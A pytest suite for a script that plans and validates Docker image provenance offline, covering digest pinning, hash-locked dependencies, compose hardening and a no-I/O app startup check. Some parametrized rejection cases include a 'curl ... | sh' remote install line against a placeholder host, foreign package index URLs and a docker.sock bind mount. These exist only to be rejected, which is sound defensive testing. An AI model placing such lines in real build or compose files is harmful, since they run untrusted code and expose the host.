"""H1b offline draft gates; synthetic identities, NEVER Docker/registry UAT."""
from __future__ import annotations

import ast
from copy import deepcopy
import hashlib
import os
from pathlib import Path
import runpy
import shutil
import subprocess
import sys

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts/pcp-local-image-provenance-plan.py"
CONTRACT = ROOT / "profiles/pcp-local/image-provenance.example.yml"
COMPOSE = ROOT / "profiles/pcp-local/.ddev/docker-compose.platform.yaml"
DOCKERFILE = ROOT / "profiles/pcp-local/runtime/Dockerfile.inspect"
LOCK = ROOT / "profiles/pcp-local/runtime/requirements-inspect.lock"
HEAD = "a" * 40
BASE = "python:3.13-slim-bookworm@sha256:" + "b" * 64
DIGEST = "sha256:" + "c" * 64
APP_HASH = "d" * 64


@pytest.fixture
def plan():
    return runpy.run_path(str(SCRIPT))


@pytest.fixture
def manifest():
    return yaml.safe_load(CONTRACT.read_text())


@pytest.fixture
def compose():
    return yaml.safe_load(COMPOSE.read_text())


def reason(fn, expected):
    with pytest.raises(Exception) as exc:
        fn()
    assert type(exc.value).__name__ == "Stop"
    assert str(exc.value) == expected


def fake_lock(plan):
    # Invented test-only hashes, never written into source artifact pins.
    return ("--require-hashes\n--only-binary=:all:\n" + "".join(
        name + "==1.2.3 --hash=sha256:" + "e" * 64 + "\n"
        for name in sorted(plan["LOCK_PACKAGES"])
    )).encode()


def evaluate(plan, manifest, compose, *, lock=None, recipe=None, app_hash=APP_HASH):
    return plan["assess"](
        manifest, head=HEAD, dockerfile=recipe or DOCKERFILE.read_bytes(),
        requirements=lock if lock is not None else fake_lock(plan),
        app_tree_sha256=app_hash, compose=compose,
    )


def complete_recipe(plan, manifest, *, lock=None):
    m = deepcopy(manifest)
    m["source_commit"] = HEAD
    m["build"].update(
        base_image=BASE,
        dockerfile_sha256=hashlib.sha256(DOCKERFILE.read_bytes()).hexdigest(),
        requirements_sha256=hashlib.sha256(lock if lock is not None else fake_lock(plan)).hexdigest(),
        app_tree_sha256=APP_HASH,
    )
    return m


def complete_artifact(m):
    m = deepcopy(m)
    m["artifact"].update(
        image_ref="pcp-local-runtime-inspect@" + DIGEST, digest=DIGEST,
        config_digest="sha256:" + "f" * 64, buildx_metadata_sha256="1" * 64,
        attestation_sha256="2" * 64, sbom_sha256="3" * 64,
    )
    return m


def claimed_provenance(m):
    return {
        "verifier": "independent", "statement_sha256": "4" * 64,
        "subject_digest": m["artifact"]["digest"], "source_commit": HEAD,
        **{key: m["build"][key] for key in
           ("dockerfile_sha256", "requirements_sha256", "app_tree_sha256")},
    }


def test_checked_in_draft_is_unresolved_not_a_fabricated_pin(plan, manifest, compose):
    assert manifest["approval_state"] == "draft"
    assert manifest["source_commit"] is None
    assert manifest["build"]["base_image"] is None
    assert all(v is None for v in manifest["artifact"].values())
    assert manifest["independent_provenance"] is None
    assert not plan["validate_lock"](LOCK.read_bytes())
    assert evaluate(plan, manifest, compose, lock=LOCK.read_bytes()) == "SOURCE_AUTHORITY_NOT_PINNED"
    doc = complete_recipe(plan, manifest, lock=LOCK.read_bytes())
    assert evaluate(plan, doc, compose, lock=LOCK.read_bytes()) == "DEPENDENCY_LOCK_NOT_RESOLVED"


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("source_commit", "f" * 39, "SOURCE_COMMIT_INVALID"),
    ("source_commit", "b" * 40, "SOURCE_COMMIT_MISMATCH"),
    ("source_commit", True, "SOURCE_COMMIT_INVALID"),
    ("schema_version", True, "MANIFEST_SCHEMA_INVALID"),
    ("schema_version", 1, "MANIFEST_SCHEMA_INVALID"),
    ("project_id", "foreign", "FOREIGN_IMAGE_PROJECT"),
    ("repository", "someone/foreign", "FOREIGN_IMAGE_PROJECT"),
    ("approval_state", "approved", "IMAGE_AUTHORITY_NOT_APPROVED"),
])
def test_source_and_authority_rejected(plan, manifest, compose, field, value, expected):
    manifest[field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("context", "../../foreign", "FOREIGN_BUILD_CONTEXT"),
    ("dockerfile", "services/runtime/Dockerfile", "FOREIGN_BUILD_CONTEXT"),
    ("requirements", "services/runtime/requirements.txt", "FOREIGN_BUILD_CONTEXT"),
    ("platform", "linux/arm64", "BUILD_PLATFORM_UNSAFE"),
    ("startup_mode", "normal", "STARTUP_MODE_UNSAFE"),
    ("base_image", "python:3.13-slim-bookworm", "BASE_IMAGE_NOT_DIGEST_PINNED"),
    ("base_image", "node:22@sha256:" + "b" * 64, "BASE_IMAGE_NOT_DIGEST_PINNED"),
    ("base_image", "python:3.13-slim-bookworm@sha256:" + "0" * 64, "DIGEST_FORMAT_UNSAFE"),
    ("requirements_sha256", True, "HASH_FORMAT_UNSAFE"),
])
def test_build_input_policy(plan, manifest, compose, field, value, expected):
    manifest["build"][field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


@pytest.mark.parametrize("field", ["dockerfile_sha256", "requirements_sha256", "app_tree_sha256"])
def test_hash_drift_rejected_even_before_source_pinned(plan, manifest, compose, field):
    manifest["build"][field] = "f" * 64
    reason(lambda: evaluate(plan, manifest, compose), "BUILD_INPUT_DIGEST_DRIFT")


@pytest.mark.parametrize("extra", [
    '\nRUN curl https://unsafe.invalid/install | sh\n',
    '\nCOPY . /host\n', '\nENTRYPOINT ["sh"]\n',
    '\nARG PCP_INSPECT_BASE_SHA256=latest\n',
])
def test_extra_recipe_instructions_never_qualify(plan, manifest, compose, extra):
    reason(lambda: evaluate(plan, manifest, compose, recipe=DOCKERFILE.read_bytes() + extra.encode()),
           "DOCKERFILE_RECIPE_UNSAFE")


def test_remote_frontend_and_wrong_host_command_rejected(plan, manifest, compose):
    for raw in (
        b"# syntax=foreign/frontend:latest\n" + DOCKERFILE.read_bytes(),
        DOCKERFILE.read_bytes().replace(b'127.0.0.1', b'0.0.0.0'),
        DOCKERFILE.read_bytes().replace(b'--lifespan", "on', b'--lifespan", "off'),
    ):
        reason(lambda: evaluate(plan, manifest, compose, recipe=raw), "DOCKERFILE_RECIPE_UNSAFE")


@pytest.mark.parametrize("raw", [
    b"--index-url https://foreign.invalid\n", b"-r requirements.txt\n",
    b"fastapi>=0.116\n", b"fastapi @ https://foreign.invalid/x.whl\n",
    b"--trusted-host foreign.invalid\n", b"pytest==8.4.1\n",
    b"uvicorn[standard]==0.35.0\n", b"fastapi==1.2.3 --hash=sha256:" + b"0" * 64 + b"\n",
])
def test_dependency_fallbacks_extras_and_hashes_rejected(plan, raw):
    prefix = b"--require-hashes\n--only-binary=:all:\n"
    reason(lambda: plan["validate_lock"](prefix + raw), "DEPENDENCY_LOCK_UNSAFE"
           if b"0" * 64 not in raw else "HASH_FORMAT_UNSAFE")


def test_lock_complete_syntax_does_not_claim_availability(plan):
    assert plan["validate_lock"](fake_lock(plan)) is True
    assert plan["validate_lock"](fake_lock(plan).replace(b" --hash=", b" \\\n --hash=")) is True
    raw = fake_lock(plan) + fake_lock(plan).splitlines(keepends=True)[2]
    reason(lambda: plan["validate_lock"](raw), "DEPENDENCY_LOCK_UNSAFE")


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("image_ref", "personal-coding-platform-coding-runtime:local", "UNSAFE_IMAGE_REFERENCE"),
    ("image_ref", "pcp-local-runtime-inspect:latest", "UNSAFE_IMAGE_REFERENCE"),
    ("image_ref", "foreign@" + DIGEST, "UNSAFE_IMAGE_REFERENCE"),
    ("digest", "sha256:bad", "DIGEST_FORMAT_UNSAFE"),
    ("config_digest", "sha256:" + "0" * 64, "DIGEST_FORMAT_UNSAFE"),
    ("sbom_sha256", "0" * 64, "HASH_FORMAT_UNSAFE"),
])
def test_unsafe_artifact_identity(plan, manifest, compose, field, value, expected):
    manifest["artifact"][field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


def test_image_attestation_and_material_mismatches(plan, manifest, compose):
    doc = complete_artifact(complete_recipe(plan, manifest))
    doc["artifact"]["image_ref"] = "pcp-local-runtime-inspect@sha256:" + "9" * 64
    reason(lambda: evaluate(plan, doc, compose), "IMAGE_DIGEST_MISMATCH")
    doc = complete_artifact(complete_recipe(plan, manifest))
    for field, value, expected in (
        ("subject_digest", "sha256:" + "9" * 64, "ATTESTATION_SUBJECT_MISMATCH"),
        ("source_commit", "b" * 40, "ATTESTATION_SOURCE_MISMATCH"),
        ("requirements_sha256", "9" * 64, "ATTESTATION_MATERIALS_MISMATCH"),
    ):
        doc["independent_provenance"] = {**claimed_provenance(doc), field: value}
        reason(lambda: evaluate(plan, doc, compose), expected)


@pytest.mark.parametrize(("field", "value", "expected"), [
    ("exporter", "classic_load", "ATTESTATION_EXPORT_UNSAFE"),
    ("exporter", "docker", "ATTESTATION_EXPORT_UNSAFE"),
    ("image_store", "classic", "IMAGE_STORE_ATTESTATION_UNSAFE"),
    ("image_store", "unknown", "IMAGE_STORE_ATTESTATION_UNSAFE"),
    ("provenance_mode", "min", "ATTESTATION_POLICY_UNSAFE"),
    ("sbom_required", False, "ATTESTATION_POLICY_UNSAFE"),
])
def test_store_and_attestation_policy(plan, manifest, compose, field, value, expected):
    manifest["evidence"][field] = value
    reason(lambda: evaluate(plan, manifest, compose), expected)


def test_all_claimed_evidence_registry_unavailable_still_stop(plan, manifest, compose):
    doc = complete_recipe(plan, manifest)
    assert evaluate(plan, doc, compose) == "ARTIFACT_DIGEST_NOT_ATTESTED"
    doc = complete_artifact(doc)
    assert evaluate(plan, doc, compose) == "IMAGE_STORE_NOT_ATTESTED"
    for exporter in ("registry", "oci_layout"):
        doc["evidence"].update(exporter=exporter, image_store=exporter)
        assert evaluate(plan, doc, compose) == "INDEPENDENT_ATTESTATION_NOT_VERIFIED"
        doc["independent_provenance"] = claimed_provenance(doc)
        assert evaluate(plan, doc, compose) == "INDEPENDENT_ATTESTATION_NOT_VERIFIED"
    doc["evidence"]["image_store"] = "containerd"
    reason(lambda: evaluate(plan, doc, compose), "IMAGE_STORE_EXPORT_MISMATCH")


@pytest.mark.parametrize(("key", "value"), [
    ("profiles", []), ("image", "personal-coding-platform-coding-runtime:local"),
    ("pull_policy", "always"), ("command", ["python", "-m", "uvicorn", "app.main:app"]),
    ("read_only", 1), ("cap_drop", []), ("restart", "always"),
    ("environment", {"PCP_LOCAL_TASK_WORKER_ENABLED": "1"}),
    ("volumes", [{"type": "bind", "source": "/var/run/docker.sock"}]),
])
def test_compose_exact_parked_contract(plan, manifest, compose, key, value):
    compose["services"]["coding-runtime"][key] = value
    reason(lambda: evaluate(plan, manifest, compose), "COMPOSE_NOT_PARKED")


@pytest.mark.parametrize("key", [
    "ports", "expose", "build", "privileged", "entrypoint", "env_file", "secrets",
    "devices", "volumes_from", "network_mode", "healthcheck", "post_start",
])
def test_compose_capability_expansion(plan, manifest, compose, key):
    compose["services"]["coding-runtime"][key] = {"unsafe": True}
    reason(lambda: evaluate(plan, manifest, compose), "COMPOSE_UNSAFE")


def test_unknown_manifest_keys_and_bad_provenance_shape(plan, manifest, compose):
    for section in (manifest, manifest["artifact"], manifest["evidence"]):
        section["activate"] = True
        reason(lambda: evaluate(plan, manifest, compose), "MANIFEST_SCHEMA_INVALID")
        section.pop("activate")
    manifest["independent_provenance"] = {"verifier": "independent"}
    reason(lambda: evaluate(plan, manifest, compose), "INDEPENDENT_PROVENANCE_SHAPE_INVALID")


def test_app_inputs_digest_and_symlink_guard(plan, tmp_path):
    fn = plan["app_inputs"]
    globals_ = fn.__globals__
    app = tmp_path / "app"
    app.mkdir()
    (app / "main.py").write_text("x = 1\n")
    (app / "__init__.py").write_bytes(b"")
    globals_.update(ROOT=tmp_path, APP=app)
    first = plan["app_digest"](fn())
    (app / "main.py").write_text("x = 2\n")
    assert plan["app_digest"](fn()) != first
    (app / "foreign.py").symlink_to(tmp_path / "missing.py")
    reason(fn, "SOURCE_FILE_UNSAFE")
    (app / "foreign.py").unlink()
    (app / "secret.env").write_text("fake")
    reason(fn, "APP_NON_PYTHON_INPUT_UNSAFE")


@pytest.mark.parametrize(("fault", "expected"), [
    ("dirty", "SOURCE_NOT_CLEAN"), ("wrong_origin", "WRONG_SOURCE_ORIGIN"),
    ("wrong_root", "WRONG_SOURCE_ROOT"), ("bad_head", "SOURCE_SHA_INVALID"),
])
def test_checkout_guards_without_real_git(plan, monkeypatch, fault, expected):
    fn = plan["check_checkout"]
    monkeypatch.setattr(os, "geteuid", lambda: 1000)
    for key in plan["DANGEROUS_ENV"]:
        monkeypatch.delenv(key, raising=False)
    def git(*args):
        if args == ("rev-parse", "--show-toplevel"):
            return "/foreign" if fault == "wrong_root" else str(ROOT)
        if args == ("remote", "get-url", "origin"):
            return "foreign" if fault == "wrong_origin" else sorted(plan["ORIGINS"])[0]
        if args == ("rev-parse", "HEAD"):
            return "bad" if fault == "bad_head" else HEAD
        return " M fake" if fault == "dirty" else ""
    fn.__globals__["git_read"] = git
    reason(fn, expected)


def test_source_only_cli_no_build_or_default_host_action(plan, capsys):
    assert plan["main"](["--build"]) == 2
    assert "PCP_H1A_REASON=USAGE_SOURCE_ONLY" in capsys.readouterr().out
    fn = plan["main"]
    fn.__globals__["check_checkout"] = lambda: HEAD
    fn.__globals__["app_inputs"] = lambda: {"main.py": b"fake"}
    assert fn(["--check"]) == 2
    out = capsys.readouterr().out
    assert "PCP_H1A_REASON=SOURCE_AUTHORITY_NOT_PINNED" in out
    assert "PCP_H1A_IMAGE_BUILD=NOT_RUN" in out
    assert "PCP_B22C1_LIVE=STOP" in out
    tree = ast.parse(SCRIPT.read_text())
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call)
             and isinstance(n.func, ast.Attribute) and n.func.attr == "run"]
    assert len(calls) == 1  # existing allowlisted read-only Git helper only
    assert '"git", "-C"' in SCRIPT.read_text()
    for name in ('"docker",', '"ddev",', '"buildx",'):
        assert name not in SCRIPT.read_text()
    imported = {n.names[0].name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import)}
    imported |= {n.module.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}
    assert not imported & {"urllib", "requests", "httpx", "socket"}


def test_new_source_paths_classified_protected():
    policy = runpy.run_path(str(ROOT / "scripts/check_project_doc_authority.py"))
    for path in (SCRIPT, CONTRACT, DOCKERFILE, LOCK, COMPOSE):
        assert policy["classify_path"](str(path.relative_to(ROOT))) == "protected"


def test_actual_app_import_and_synthetic_image_lifespan_no_io(tmp_path):
    """Real app, ASGI only, no TCP/container/DB. Host dependencies are not lock proof."""
    pytest.importorskip("fastapi")
    pytest.importorskip("httpx")
    pytest.importorskip("psycopg")
    # Recreate only the source COPY payload, not a Docker image or OS filesystem.
    app = tmp_path / "app"
    shutil.copytree(ROOT / "services/runtime/app", app,
                    ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
    for name in ("projects.pcp-local.yml", "project-baselines.pcp-local.yml"):
        shutil.copyfile(ROOT / "config" / name, tmp_path / name)
    code = r'''
import asyncio, importlib, importlib.abc, os, pathlib, socket, subprocess, sys
class NoOptionalTools(importlib.abc.MetaPathFinder):
    def find_spec(self, fullname, *args):
        if fullname.split(".")[0] in {"uvloop", "httptools", "watchfiles", "dotenv", "websockets"}:
            raise ModuleNotFoundError("optional protocol dependency absent in inspection image")
sys.meta_path.insert(0, NoOptionalTools())
sys.path.insert(0, os.getcwd())
def forbidden(*args, **kwargs):
    raise AssertionError("external I/O or process execution in inspection")
socket.socket.connect = forbidden
socket.getaddrinfo = forbidden
subprocess.Popen = forbidden
import psycopg
psycopg.connect = forbidden
import httpx
httpx.HTTPTransport.handle_request = forbidden
httpx.AsyncHTTPTransport.handle_async_request = forbidden
m = importlib.import_module("app.main")
async def run():
    tasks = asyncio.all_tasks()
    async with m.lifespan(m.app):
        assert asyncio.all_tasks() == tasks
        assert m.engine.worker_task is None
        assert m.engine.queue.empty()
        assert not m.engine.active_jobs
        transport = httpx.ASGITransport(app=m.app)
        async with httpx.AsyncClient(transport=transport, base_url="http://synthetic") as c:
            result = await c.get("/health")
            assert result.status_code == 200
            data = result.json()
            assert data["status"] == "degraded"
            assert data["router"] == data["executor"] == "not_checked"
            assert not any(data["adapters"].values())
            for method, path in [("GET", "/v1/jobs"), ("POST", "/v1/intake"),
                                 ("GET", "/docs"), ("GET", "/dashboard")]:
                assert (await c.request(method, path)).status_code == 503
            os.environ["PCP_RUNTIME_STARTUP_MODE"] = "normal"
            assert (await c.get("/health")).status_code == 503
    assert asyncio.all_tasks() == tasks
    try:
        async with m.lifespan(m.app):
            raise AssertionError("mode override reached legacy startup")
    except RuntimeError as exc:
        assert "PCP-local" in str(exc)
asyncio.run(run())
# Exercise the selected minimal uvicorn protocol imports without binding a port.
import uvicorn
config = uvicorn.Config(m.app, loop="asyncio", http="h11", lifespan="on", ws="none")
config.load()
print("SYNTHETIC_INSPECTION_NO_IO=PASS")
'''
    env = {
        "PATH": str(Path(sys.executable).parent),
        "PCP_RUNTIME_STARTUP_MODE": "pcp_local_inspect",
        "PROJECTS_FILE": str(tmp_path / "projects.pcp-local.yml"),
        "PROJECT_BASELINES_FILE": str(tmp_path / "project-baselines.pcp-local.yml"),
    }
    result = subprocess.run([sys.executable, "-I", "-B", "-c", code],
                            cwd=tmp_path, env=env, capture_output=True, text=True, timeout=30)
    assert result.returncode == 0, result.stderr
    assert "SYNTHETIC_INSPECTION_NO_IO=PASS" in result.stdout
